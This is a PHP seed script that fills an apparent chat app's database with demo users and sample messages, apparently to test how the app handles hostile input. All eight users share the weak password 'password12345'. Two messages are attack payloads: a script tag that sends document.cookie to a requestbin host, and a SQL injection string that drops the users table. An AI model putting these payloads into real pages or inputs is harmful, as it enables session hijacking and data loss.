<?php
declare(strict_types=1);

require_once __DIR__ . '/../lib/auth/UserAuth.php';
require_once __DIR__ . '/../lib/message/MessageManager.php';

/**
 * seed_data.php - Seeds the database with initial test data
 * Only runs if the database is empty
 */

class DataSeeder
{
    private const TEST_USERS = [
        ['username' => 'FroggyFrank0x539', 'password' => 'password12345', 'avatar' => '🐸'],
        ['username' => 'TubularTurtle0x2A', 'password' => 'password12345', 'avatar' => '🐢'],
        ['username' => 'SlickSnake25', 'password' => 'password12345', 'avatar' => '🐍'],
        ['username' => 'RadicalRex247', 'password' => 'password12345', 'avatar' => '🦖'],
        ['username' => 'DynamiteDino1337', 'password' => 'password12345', 'avatar' => '🦕'],
        ['username' => 'DoggyDan342', 'password' => 'password12345', 'avatar' => '🐶'],
        ['username' => 'CoolCat67', 'password' => 'password12345', 'avatar' => '🐱'],
        ['username' => 'ButterflyBetty42', 'password' => 'password12345', 'avatar' => '🦋']
    ];

    private const SAMPLE_MESSAGES = [
        "I love cookies!🍪 '<script>window.location.replace(\"https://requestbin.kanbanbox.com/ACB798?\" + document.cookie)</script>'",
        "Is there a seahorse emoji?🐎",
        "Are there any NFL teams that don't end in s?",
        "When will there be soja-döner again??😥",
        "Hey \"@'; DROP TABLE users;--\", how are you doing? 🗑️",
        "Attention, the floor is java! ☕",
        "Why do Java developers wear glasses? Because they don't C# 😎",
        "I'm not procrastinating, I'm just refactoring my time ⏰",
        "404: Motivation not found 😴",
        "Copy-paste from Stack Overflow without reading: 10% of the time, it works every time 📋",
        "There's no place like 127.0.0.1 🏠"
    ];

    public static function seed(string $dbPath): void
    {
        $messageManager = new MessageManager($dbPath);
        
        // Only seed if database is empty
        if ($messageManager->hasMessages()) {
            return;
        }

        $userAuth = new UserAuth($dbPath);

        // Register test/demo users
        foreach (self::TEST_USERS as $user) {
            $userAuth->register($user['username'], $user['password'], $user['avatar']);
        }

        // Create sample messages with ordered timestamps
        $currentTime = time();
        $oneDayAgo = $currentTime - 86400;

        $db = new SQLite3($dbPath);
        foreach (self::SAMPLE_MESSAGES as $index => $content) {
            $randomUser = self::TEST_USERS[array_rand(self::TEST_USERS)];
            $randomTime = rand($oneDayAgo, $currentTime - (count(self::SAMPLE_MESSAGES) - $index) * 600);
            
            $stmt = $db->prepare("INSERT INTO messages (username, content, created_at) VALUES (:username, :content, :created_at)");
            $stmt->bindValue(':username', $randomUser['username'], SQLITE3_TEXT);
            $stmt->bindValue(':content', $content, SQLITE3_TEXT);
            $stmt->bindValue(':created_at', $randomTime, SQLITE3_INTEGER);
            $stmt->execute();
        }
        $db->close();
    }
}
